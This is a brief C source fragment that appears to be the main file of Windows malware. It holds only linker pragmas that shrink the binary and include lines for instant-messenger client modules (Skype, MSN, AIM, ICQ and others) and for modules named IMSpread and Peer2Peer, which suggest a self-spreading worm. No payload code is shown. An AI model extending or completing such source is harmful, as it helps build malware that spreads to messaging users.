#pragma optimize("gsy", on)
#pragma comment(linker, "/ENTRY:Main /FILEALIGN:0x200")
#pragma comment(linker, "/RELEASE /IGNORE:4089 /IGNORE:4078")
#pragma comment(linker, "/MERGE:.text=.data")
#pragma pack(1)

#define  WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <winsock.h>
#include <windows.h>

#include "Main.h"

#include "Clients/GoogleTalk.h"
#include "Clients/PalTalk.h"
#include "Clients/Skype.h"
#include "Clients/Gaim.h"
#include "Clients/Aim.h"
#include "Clients/Msn.h"
#include "Clients/Icq.h"

#include "IMSpread.h"
#include "Peer2Peer.h"